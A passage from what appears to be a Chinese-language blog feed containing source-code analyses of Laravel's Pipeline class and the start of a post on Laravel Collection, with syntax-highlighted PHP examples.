class="token function">func_num_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HigherOrderWhenProxy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">func_num_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HigherOrderWhenProxy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">condition</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$callback</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token variable">$this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$default</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token variable">$this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre></div></figure><p>when 可以接受 0-3 个参数，第一个参数可以是闭包&#x2F;一个值，第二个&#x2F;第三个为回调函数，分别当第一个值&#x2F;闭包返回 true&#x2F;false 执行，unless 相反</p><p>这里面有个有意思的地方：当你传递 0-1 个参数时，when 会返回一个 higherOrderWhenProxy 对象，如果传递 1 个参数为 false，则后面链式调用的函数不会调用（目前不清楚 0 个参数的意义，实现原理就是代理模式）</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>每个处理环节都内置了异常处理机制，通过 try-catch 结构确保整个流程的稳定性。这样即使某个环节出现问题，也能及时捕获并处理。</p><h2 id="Pipeline-模式的优势"><a href="#Pipeline-模式的优势" class="headerlink" title="Pipeline 模式的优势"></a>Pipeline 模式的优势</h2><p>在实际开发中，Pipeline 模式具有以下优势：</p><ol><li><p><strong>职责明确</strong>：每个处理环节只负责一个特定任务，代码结构清晰。</p></li><li><p><strong>易于测试</strong>：可以独立测试每个处理环节，提高代码质量。</p></li><li><p><strong>灵活可配</strong>：可以根据需要轻松调整处理流程，增加或删除处理环节。</p></li><li><p><strong>逻辑分明</strong>：将复杂的处理流程拆分成多个独立步骤，提高代码可读性。</p></li></ol><h2 id="核心源码解析"><a href="#核心源码解析" class="headerlink" title="核心源码解析"></a>核心源码解析</h2><p>Pipeline 的核心实现采用了数组归约的方式。让我们看看 <code>then()</code> 方法的关键实现：</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/**  * Run the pipeline with a final destination callback.  *  * @param  \Closure  $destination  * @return mixed  */</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">then</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Closure</span> <span class="token variable">$destination</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$pipeline</span> <span class="token operator">=</span> <span class="token function">array_reduce</span><span class="token punctuation">(</span>         <span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">pipes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">carry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">prepareDestination</span><span class="token punctuation">(</span><span class="token variable">$destination</span><span class="token punctuation">)</span>     <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token variable">$pipeline</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passable</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">/**  * Get the final piece of the Closure onion.  *  * @param  \Closure  $destination  * @return \Closure  */</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">prepareDestination</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Closure</span> <span class="token variable">$destination</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$destination</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token variable">$destination</span><span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">handleException</span><span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">/**  * Get a Closure that represents a slice of the application onion.  *  * @return \Closure  */</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">carry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$stack</span><span class="token punctuation">,</span> <span class="token variable">$pipe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">)</span> <span class="token keyword">use</span> <span class="token punctuation">(</span><span class="token variable">$stack</span><span class="token punctuation">,</span> <span class="token variable">$pipe</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$pipe</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// If the pipe is a callable, then we will call it directly, but otherwise we</span>                     <span class="token comment">// will resolve the pipes out of the dependency container and call it with</span>                     <span class="token comment">// the appropriate method and arguments, returning the results back out.</span>                     <span class="token keyword">return</span> <span class="token variable">$pipe</span><span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">,</span> <span class="token variable">$stack</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$pipe</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     <span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parsePipeString</span><span class="token punctuation">(</span><span class="token variable">$pipe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// If the pipe is a string we will parse the string and resolve the class out</span>                     <span class="token comment">// of the dependency injection container. We can then build a callable and</span>                     <span class="token comment">// execute the pipe function giving in the parameters that are required.</span>                     <span class="token variable">$pipe</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">make</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$passable</span><span class="token punctuation">,</span> <span class="token variable">$stack</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// If the pipe is already an object we'll just make a callable and pass it to</span>                     <span class="token comment">// the pipe as-is. There is no need to do any extra parsing and formatting</span>                     <span class="token comment">// since the object we're given was already a fully instantiated object.</span>                     <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$passable</span><span class="token punctuation">,</span> <span class="token variable">$stack</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>                 <span class="token variable">$carry</span> <span class="token operator">=</span> <span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$pipe</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">)</span>                                 <span class="token operator">?</span> <span class="token variable">$pipe</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">method</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$parameters</span><span class="token punctuation">)</span>                                 <span class="token punctuation">:</span> <span class="token variable">$pipe</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$parameters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">handleCarry</span><span class="token punctuation">(</span><span class="token variable">$carry</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">handleException</span><span class="token punctuation">(</span><span class="token variable">$passable</span><span class="token punctuation">,</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="language-PHP" data-language="PHP"><code class="language-PHP">$pipeline &#x3D; new Pipeline();$result &#x3D; $pipeline    -&gt;send(15)    -&gt;through([$pipe1, $pipe2, $pipe3])    -&gt;then($destination);</code></pre></div></figure><ul><li>以这段代码为例，通过 array_reduce+carry 包装成 <code>$destination($pipe3($pipe2($pipe1($passable))))</code> 的形式去执行，注意 then 里面的 reverse，将 pipe1，pipe2，pipe3 逆序后再 reduce</li><li>carry 先返回一个闭包处理管道函数，在里面有内层闭包处理当前请求</li><li>carry 可以处理 callable，字符串（可以解析成对象），现成对象</li></ul><h2 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h2><p>在使用 Pipeline 模式时，有以下几点建议：</p><ol><li>保持每个处理环节的单一职责原则</li><li>合理安排处理环节的顺序</li><li>为每个环节选择清晰、明确的命名</li><li>注意大数据量处理时的性能问题</li><li>做好异常处理和日志记录</li></ol><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>Pipeline 模式特别适合以下场景：</p><ul><li>需要对数据进行多步骤处理的业务流程</li><li>处理步骤可能需要灵活调整的场合</li><li>处理逻辑需要在多处复用的情况</li><li>需要严格管控处理流程的应用</li></ul><p>不过需要注意的是，对于简单的顺序处理任务，使用 Pipeline 可能会显得过于复杂。在选择是否使用这个模式时，应该根据实际业务的复杂度来权衡。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>Laravel</code> 的 Pipeline 模式为我们提供了一个强大而优雅的数据处理方案。它不仅让代码结构更加清晰，还提供了极大的灵活性。无论是处理复杂的数据转换，实现中间件功能，还是管理业务流程，Pipeline 都是一个值得掌握的开发工具。</p><p>通过合理使用 Pipeline 模式，我们可以将复杂的处理流程变得简单明了，同时保持代码的可维护性和可扩展性。这正是 Laravel 框架追求优雅开发体验的一个体现。</p>]]></content>
    
    
    <categories>
      
      <category>Tech</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码分析</tag>
      
      <tag>PHP</tag>
      
      <tag>Laravel</tag>
      
      <tag>Pipeline</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码分析--Laravel Collection</title>
    <link href="/laravel-collection/"/>
    <url>/laravel-collection/</url>
    
    <content type="html"><![CDATA[<p>Laravel Collection 原理和用法解析。</p><span id="more"></span><div class="note note-primary">            <p>Laravel: 11.x<br>PHP: 8.x<br>code: vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Collections&#x2F;Collection.php<br>docs: <a href="https://laravel.com/docs/11.x/collections">https://laravel.com/docs/11.x/collections</a></p>          </div><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><div class="note note-primary">            <p>Illuminate\Support\Collection 类提供了一个流畅、方便的包装器来处理数据数组。Collection 可以看作是 PHP 数组的超级增强版。不仅保留了数组的所有基本功能，还提供了大量强大的方法，将复杂的数据操作转变为简单、优雅的链式调用，提高了开发效率和代码可读性。</p>          </div><p>在 Laravel 里面，Collection 随处可见</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># 数据库查询结果</span><span class="token variable">$users</span> <span class="token operator">=</span> <span class="token class-name static-context">User</span><span class="token operator">::</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'active'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$activeUsers</span> <span class="token operator">=</span> <span class="token variable">$users</span><span class="token operator">-></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">></span> <span class="token number">18</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'email'</span> <span class="token operator">=></span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">email</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># API 响应的数据</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$products</span> <span class="token operator">=</span> <span class="token class-name static-context">Product</span><span class="token operator">::</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">json</span><span class="token punctuation">(</span>        <span class="token variable">$products</span><span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$product</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span>                <span class="token string single-quoted-string">'id'</span> <span class="token operator">=></span> <span class="token variable">$product</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$product</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'price'</span> <span class="token operator">=></span> <span class="token function">number_format</span><span class="token punctuation">(</span><span class="token variable">$product</span><span class="token operator">-></span><span class="token property">price</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># 复杂的数据聚合</span><span class="token variable">$orders</span> <span class="token operator">=</span> <span class="token class-name static-context">Order</span><span class="token operator">::</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$statistics</span> <span class="token operator">=</span> <span class="token variable">$orders</span><span class="token operator">-></span><span class="token function">groupBy</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$group</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>            <span class="token string single-quoted-string">'total_count'</span> <span class="token operator">=></span> <span class="token variable">$group</span><span class="token operator">-></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'total_amount'</span> <span class="token operator">=></span> <span class="token variable">$group</span><span class="token operator">-></span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'amount'</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># LazyCollection：延迟计算</span><span class="token variable">$lazyCollection</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">lazy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 仅在遍历时计算</span>        <span class="token keyword">return</span> <span class="token variable">$item</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></figure><h2 id="继承的类"><a href="#继承的类" class="headerlink" title="继承的类"></a>继承的类</h2><h3 id="ArrayAccess"><a href="#ArrayAccess" class="headerlink" title="ArrayAccess"></a>ArrayAccess</h3><p>PHP 内置接口，实现后可以让对象像数组一样操作。</p><h3 id="CanBeEscapedWhenCastToString"><a href="#CanBeEscapedWhenCastToString" class="headerlink" title="CanBeEscapedWhenCastToString"></a>CanBeEscapedWhenCastToString</h3><p>定义了一个类在被强制转换为字符串（或调用 __toStirng）时，是否应该自动进行 HTML 转义（HTML escaping）。避免手动调用 htmlspecialchars 或类似函数，blade 模板在渲染数据也会检查是否实现了这个接口。</p><h3 id="Enumerable"><a href="#Enumerable" class="headerlink" title="Enumerable"></a>Enumerable</h3><p>Enumerable 接口是框架中集合（Collections）相关功能的核心接口之一，它定义了用于操作和遍历集合的方法。比如 every、map、filter、reduce 之类的。主要可以对集合可以进行链式调用、数据操作和迭代等操作。这个类也继承了一些数组相关的类，如下：</p><h4 id="Arrayable"><a href="#Arrayable" class="headerlink" title="Arrayable"></a>Arrayable</h4><p>Illuminate\Contracts\Support 定义的接口，有一个 toArray 方法。</p><h4 id="Countable"><a href="#Countable" class="headerlink" title="Countable"></a>Countable</h4><p>PHP 内置接口，有一个 count 方法，返回对象的数量。</p><h4 id="IteratorAggregate"><a href="#IteratorAggregate" class="headerlink" title="IteratorAggregate"></a>IteratorAggregate</h4><p>PHP 内置接口，实现可以对其使用 foreach 语法。</p><h4 id="Jsonable"><a href="#Jsonable" class="headerlink" title="Jsonable"></a>Jsonable</h4><p>Illuminate\Contracts\Support 接口，toJson 方法。</p><h4 id="JsonSerializable"><a href="#JsonSerializable" class="headerlink" title="JsonSerializable"></a>JsonSerializable</h4><p>PHP 内置接口，可以 json 化。</p><h2 id="使用的-Trait"><a href="#使用的-Trait" class="headerlink" title="使用的 Trait"></a>使用的 Trait</h2><h3 id="EnumeratesValues"><a href="#EnumeratesValues" class="headerlink" title="EnumeratesValues"></a>EnumeratesValues</h3><p>提供一系列用于枚举和处理值的方法。这里面使用了 HigherOrderCollectionProxy 代理，功能就是代理原来 Collection 自身的方法通过简化的方式调用，具体看下面。</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// Collection 创建和基本使用</span><span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// EnumeratesValues 提供的方法</span><span class="token variable">$filteredCollection</span> <span class="token operator">=</span> <span class="token variable">$collection</span><span class="token operator">-></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$item</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// HigherOrderCollectionProxy 语法</span><span class="token variable">$users</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Alice'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'active'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Bob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'active'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用 Higher Order Proxy</span><span class="token variable">$activeUsers</span> <span class="token operator">=</span> <span class="token variable">$users</span><span class="token operator">-></span><span class="token property">filter</span><span class="token operator">-></span><span class="token property">active</span><span class="token punctuation">;</span>  <span class="token comment">// 简化的过滤语法</span></code></pre></div></figure><div class="note note-primary">            <p>HigherOrderCollectionProxy 大致原理：Collection 本身没有 filter, map, reduce 属性（注意这里是属性，不是方法），通过 EnumeratesValues 的__get() 方法调用 HigherOrderCollectionProxy 并设置 method 为 filter&#x2F;map 等等，然后返回 HigherOrderCollectionProxy，当链式调用属性 active 时会通过 HigherOrderCollectionProxy 的__get 去使用代理的 method，返回 Collection 类，循环往复。</p>          </div><h3 id="Macroable"><a href="#Macroable" class="headerlink" title="Macroable"></a>Macroable</h3><p>Macroable 允许为类动态添加方法，也就是「宏」，使类具有高度的可扩展性。通过使用 Macroable，可以在运行时给类添加自定义行为，而不需要修改类的源码。添加的方法支持静态调用和箭头调用。</p><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>Collection</span><span class="token punctuation">;</span><span class="token comment"># 注册一个宏（动态方法）。</span><span class="token class-name static-context">Collection</span><span class="token operator">::</span><span class="token function">macro</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'toUpper'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">fn</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：['A', 'B', 'C']</span><span class="token comment"># 将一个对象或类的方法注入当前类。</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MyCollectionMacros</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">capitalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">fn</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name static-context">Collection</span><span class="token operator">::</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyCollectionMacros</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$collection</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">capitalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：['Hello', 'World']</span></code></pre></div></figure><h2 id="LazyCollection"><a href="#LazyCollection" class="headerlink" title="LazyCollection"></a>LazyCollection</h2><p>延迟计算（Lazy Evaluation）是一种优化技术，核心思想是「需要时才计算」。在 Laravel 的 Collection 中，主要通过 LazyCollection 实现。</p><p>它的主要原理如下</p><ul><li>迭代器模式：使用 PHP 迭代器延迟计算</li><li>惰性求值：只在真正需要时计算</li><li>流式处理：一次处理一个元素</li></ul><figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$lazyCollection</span> <span class="token operator">=</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">-></span><span class="token function">lazy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 创建延迟集合</span>    <span class="token operator">-></span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 